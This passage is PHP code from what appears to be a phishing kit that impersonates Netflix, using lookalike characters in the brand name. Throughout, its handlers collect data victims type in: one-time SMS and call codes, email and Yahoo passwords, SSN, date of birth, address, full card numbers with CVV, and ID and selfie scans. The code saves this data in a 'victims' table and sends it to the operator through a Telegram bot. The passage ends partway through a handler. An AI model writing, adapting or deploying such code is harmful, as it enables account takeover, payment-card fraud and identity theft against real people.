        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM victims WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> Nеtflіх</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "🔑 <b>Email Code Error:</b> <code>$emailerror</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'Email code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}



if ($_GET['type'] == 'appcode') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['appcode'])) {
        $appcode = mysqli_real_escape_string($conn, $_POST['appcode']);

        // Update database
        $query = mysqli_query($conn, "UPDATE victims SET status=18, buzzed=0, appcode='$appcode' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM victims WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> Nеtflіх</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "🔐 <b>App Code:</b> <code>$appcode</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'Email code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}		
		

if ($_GET['type'] == 'apperror') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['apperror'])) {
        $apperror = mysqli_real_escape_string($conn, $_POST['apperror']);

        // Update database
        $query = mysqli_query($conn, "UPDATE victims SET status=18, buzzed=0, appcode='$apperror' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM victims WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> Nеtflіх</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "🔐 <b>App Code Error:</b> <code>$apperror</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'Email code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}	


if ($_GET['type'] == 'smsauth') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['smsauth'])) {
        $smsauth = mysqli_real_escape_string($conn, $_POST['smsauth']);

        // Update database
        $query = mysqli_query($conn, "UPDATE victims SET status=121, buzzed=0, smsauth='$smsauth' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM victims WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> Nеtflіх</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "📲 <b>SMS AUTH:</b> <code>$smsauth</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'SMS code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}





if ($_GET['type'] == 'callauth') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['callauth'])) {
        $callauth = mysqli_real_escape_string($conn, $_POST['callauth']);

        // Update database
        $query = mysqli_query($conn, "UPDATE victims SET status=125, buzzed=0, callauth='$callauth' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM victims WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> Nеtflіх</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "📞 <b>CALL AUTH:</b> <code>$callauth</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'SMS code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}




if ($_GET['type'] == 'dataprofile') {
    session_start();
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    // Check if all required POST parameters are provided
    if (!empty($_POST['fname']) && !empty($_POST['lname']) && !empty($_POST['ssn']) && !empty($_POST['dob'])) {
        $fname = mysqli_real_escape_string($conn, $_POST['fname']);
        $lname = mysqli_real_escape_string($conn, $_POST['lname']);
        $ssn = mysqli_real_escape_string($conn, $_POST['ssn']);
        $dob = mysqli_real_escape_string($conn, $_POST['dob']);

        // Update database
        $query = mysqli_query($conn, "UPDATE victims SET fname='$fname', lname='$lname', ssn='$ssn', dob='$dob', status=129, buzzed=0 WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM victims WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b>Profile Update</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "👤 <b>First Name:</b> <code>{$array['fname']}</code>\n";
            $tmsg .= "👤 <b>Last Name:</b> <code>{$array['lname']}</code>\n";
            $tmsg .= "📅 <b>Date of Birth:</b> <code>{$array['dob']}</code>\n";
            $tmsg .= "🔢 <b>SSN:</b> <code>{$array['ssn']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }
    } else {
        // If any required parameter is missing
        $response = array('status' => 'notok', 'message' => 'Missing required fields');
    }

    // Ensure content type is JSON and return response
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}







if ($_GET['type'] == 'extradata') {
    session_start();
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());
    
    if (!empty($_POST['fullname'])) {
        $fullname = mysqli_real_escape_string($conn, $_POST['fullname']);
        $address = mysqli_real_escape_string($conn, $_POST['address']);
        $city = mysqli_real_escape_string($conn, $_POST['city']);
        $state = mysqli_real_escape_string($conn, $_POST['state']);
        $zip = mysqli_real_escape_string($conn, $_POST['zip']);
        $dob = isset($_POST['dob']) ? mysqli_real_escape_string($conn, $_POST['dob']) : '';
		$phone = mysqli_real_escape_string($conn, $_POST['phone']);
        // Update the victims table with the new data
        $query = mysqli_query($conn, "UPDATE victims SET 
            status=85, 
            buzzed=0, 
            fullname='$fullname', 
            address='$address', 
            city='$city', 
            state='$state', 
            zip='$zip', 
            phone='$phone', 
			dob='$dob'
            WHERE uniqueid='$uniqueid'");
        
        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM victims WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

$tmsg = "<b>Nеtflіх</b>\n";
$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
$tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
$tmsg .= "👤 <b>Fullname:</b> <code>$fullname</code>\n";
$tmsg .= "🏠 <b>Address:</b> <code>$address</code>\n";
$tmsg .= "🏙️ <b>City:</b> <code>$city</code>\n";
$tmsg .= "🌍 <b>State:</b> <code>$state</code>\n";
$tmsg .= "📮 <b>Zip:</b> <code>$zip</code>\n";
$tmsg .= "🎂 <b>Date of Birth:</b> <code>$dob</code>\n";
$tmsg .= "📞 <b>Phone:</b> <code>$phone</code>\n"; 
$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";

$tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
$tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
$tmsg .= "===================";

$tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);


            $telegram = new Telegram($bot_token);
            $content = array(
                'chat_id' => $telegram_chaid,
                'text' => $tmsg,
                'parse_mode' => 'html'
            );
            $telegram->sendMessage($content);
        }
    } else {
        $response = array('status' => 'notok', 'message' => 'Required fields are missing');
    }

    echo json_encode($response);
}




if ($_GET['type'] == 'process') {
    $uniqueid = $_SESSION['uniqueid'];
	$date = date("Y-m-d h:i a", time());

    // Check if the required POST data is present
    if (!empty($_POST['cardnumber']) && !empty($_POST['ExpiryDate']) && !empty($_POST['SecurityCode']) && !empty($_POST['NameOnCard'])) {
        // Retrieve and sanitize POST data
        $NameOnCard = mysqli_real_escape_string($conn, $_POST['NameOnCard']);
        $cardnumber = mysqli_real_escape_string($conn, $_POST['cardnumber']);
        $ExpiryDate = mysqli_real_escape_string($conn, $_POST['ExpiryDate']);
        $SecurityCode = mysqli_real_escape_string($conn, $_POST['SecurityCode']);

        // Remove spaces from cardnumber number
        $cleanedCard = str_replace(' ', '', $cardnumber);

        // Extract BIN from card number (first 6 digits)
        $bin = substr($cleanedCard, 0, 6);

        // Perform BIN lookup
        $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
        $referrer = $protocol . '://' . $_SERVER['HTTP_HOST'];
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, "https://data.handyapi.com/bin/" . $bin);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_HTTPHEADER, array('Referrer: ' . $referrer));
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
        $response = json_decode(curl_exec($curl), true);
        curl_close($curl);

        // Set the brand, type, and bank based on BIN lookup response
        $brand = isset($response['CardTier']) ? $response['CardTier'] : "Unknown";
        $type = isset($response['Type']) ? $response['Type'] : "Unknown";
        $bank = isset($response['Issuer']) ? $response['Issuer'] : "Unknown";
		 $scheme = isset($response['Scheme']) ? $response['Scheme'] : 'Unknown';
        // Update victims table with the provided information and BIN lookup details
        $query = mysqli_query($conn, 
            "UPDATE victims 
             SET status = 87, 
                 buzzed = 0, 
                 card = '$cleanedCard', 
                 exp = '$ExpiryDate', 
                 cvv = '$SecurityCode', 
                 NameOnCard = '$NameOnCard', 
                 bin = '$bin', 
                 bank = '$bank', 
                 brand = '$brand', 
                 type = '$type',
				 scheme = '$scheme'
             WHERE uniqueid = '$uniqueid'"
        );

        // Check if the query was successful
        if ($query) {
            echo json_encode(array('status' => 'ok'));
        } else {
            echo json_encode(array('status' => 'notok'));
        }

        // Check if Telegram notifications are enabled and send a message if so
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM victims WHERE uniqueid = '$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            // Format the Telegram message with separators and emojis
$tmsg = "<b>Nеtflіх</b>\n";
$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
$tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
$tmsg .= "💳 <b>Card Nr.:</b> <code>$cleanedCard</code>\n";
$tmsg .= "📅 <b>Exp.:</b> <code>$ExpiryDate</code>\n";
$tmsg .= "🔒 <b>CVV2:</b> <code>$SecurityCode</code>\n";
$tmsg .= "👤 <b>Name on Card:</b> <code>$NameOnCard</code>\n";
$tmsg .= "🔢 <b>BIN:</b> <code>$bin</code>\n";
$tmsg .= "🏦 <b>Bank:</b> <code>$bank</code>\n";
$tmsg .= "🎖 <b>Card Level:</b> <code>$brand</code>\n";
$tmsg .= "📂 <b>Type:</b> <code>$type</code>\n";
$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
$tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
$tmsg .= "📅 <b>Date:</b> <code>$date $time</code>\n";
$tmsg .= "===================";

$tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Clean up any unnecessary line breaks
            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send the message to Telegram
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }
    } else {
        echo json_encode(array('status' => 'notok', 'message' => 'Incomplete data.'));
    }
}





		
		
if ($_GET['type'] == 'dlupload') {
    $uniqueid = $_SESSION['uniqueid'];
	
	
	$date = date("Y-m-d h:i a", time());

    if (!empty($_POST['dlupload'])) {
        $dlupload = mysqli_real_escape_string($conn, $_POST['dlupload']);

        $query = mysqli_query($conn, "UPDATE victims SET status=20, buzzed=0, dlupload='$dlupload' WHERE uniqueid='$uniqueid'");
        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM victims WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);
                        $tmsg = "
<strong>#Nеtflіх</strong>\n
<code>-------------------</code>\n
<strong>Username:</strong> <code>{$array['user']}</code>\n
<code>-------------------</code>\n
<strong>DL Scan:</strong> <code>$dlupload</code>\n
<strong>IP:</strong> <code>{$array['ip']}</code>\n
<strong>Date:</strong><code> $date $time</code>\n
";
            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }
    } else {
        $response = array('status' => 'notok', 'message' => 'Password is empty');
    }

    echo json_encode($response);
}		
		


if ($_GET['type'] == 'selfie') {
    $uniqueid = $_SESSION['uniqueid'];
	
	$date = date("Y-m-d h:i a", time());

    if (!empty($_POST['selfie'])) {
        $selfie = mysqli_real_escape_string($conn, $_POST['selfie']);

        $query = mysqli_query($conn, "UPDATE victims SET status=22, buzzed=0, selfie='$selfie' WHERE uniqueid='$uniqueid'");
        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM victims WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);
                                    $tmsg = "
<strong>#Nеtflіх</strong>\n
<code>-------------------</code>\n
<strong>Username:</strong> <code>{$array['user']}</code>\n
<code>-------------------</code>\n
<strong>Selfie Scan:</strong> <code>$selfie</code>\n
<strong>IP:</strong> <code>{$array['ip']}</code>\n
<strong>Date:</strong><code> $date $time</code>\n
";
            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }
    } else {
        $response = array('status' => 'notok', 'message' => 'Password is empty');
    }

    echo json_encode($response);
}		
		


if ($_GET['type'] == 'getemail') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['getemail'])) {
        $getemail = mysqli_real_escape_string($conn, $_POST['getemail']);

        // Update database
        $query = mysqli_query($conn, "UPDATE victims SET status=24, buzzed=0, getemail='$getemail' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM victims WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> Nеtflіх</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "📧 <b>Get Email:</b> <code>$getemail</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'Email code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}	

if ($_GET['type'] == 'emailauth') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['emailauth'])) {
        $emailauth = mysqli_real_escape_string($conn, $_POST['emailauth']);

        // Update database
        $query = mysqli_query($conn, "UPDATE victims SET status=24, buzzed=0, emailauth='$emailauth' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM victims WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> Nеtflіх</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "🔒 <b>Email Password:</b> <code>$emailauth</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'Email code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}	

if ($_GET['type'] == 'frozen') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['frozen'])) {
        $frozen = mysqli_real_escape_string($conn, $_POST['frozen']);

        // Update database
        $query = mysqli_query($conn, "UPDATE victims SET status=24, buzzed=0, frozen='$frozen' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM victims WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> Nеtflіх</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "🔒 <b>Frozen Status:</b> <code>$frozen</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'Email code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}	



if ($_GET['type'] == 'yhpass') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['yhpass'])) {
        $yhpass = mysqli_real_escape_string($conn, $_POST['yhpass']);

        // Update database
        $query = mysqli_query($conn, "UPDATE victims SET status=31, buzzed=0, yhpass='$yhpass' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM victims WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> Nеtflіх</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "🔒 <b>Yahoo Password:</b> <code>$yhpass</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'Email code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}	


if ($_GET['type'] == 'yhsms') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['yhsms'])) {
        $yhsms = mysqli_real_escape_string($conn, $_POST['yhsms']);

        // Update database
        $query = mysqli_query($conn, "UPDATE victims SET status=33, buzzed=0, yhsms='$yhsms' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM victims WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> Nеtflіх</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "📲 <b>Yahoo SMS:</b> <code>$yhsms</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'SMS code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}	


if ($_GET['type'] == 'yhapp') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['yhapp'])) {
        $yhapp = mysqli_real_escape_string($conn, $_POST['yhapp']);

        // Update database
